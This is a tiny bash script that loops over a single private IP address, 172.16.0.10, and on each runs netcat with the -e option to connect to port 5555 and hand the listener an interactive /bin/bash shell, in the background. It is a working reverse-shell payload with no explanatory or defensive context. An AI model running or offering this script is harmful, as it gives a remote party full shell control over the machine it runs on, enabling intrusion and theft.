#!/bin/bash

IP_ADDRESSES=('172.16.0.10')

for ip in ${IP_ADDRESSES[@]}; do
    nc $ip 5555 -e /bin/bash &
done
